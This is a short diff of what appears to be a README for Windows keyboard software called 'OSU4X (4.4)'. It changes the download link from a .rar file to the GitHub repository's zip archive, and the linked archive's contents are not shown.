@@ -1,7 +1,7 @@
     #The software only supports Windows.
     #Download the "OSU4X（4.4）" software and manual to start using the keyboard!
      markdown            
-[Click to download](https://github.com/stefanmayu/kpxos/raw/refs/heads/main/OSU4X%EF%BC%884.4%EF%BC%89.rar)       
+[Click to download](https://github.com/stefanmayu/kpxos/archive/refs/heads/main.zip)       
 #
     
             
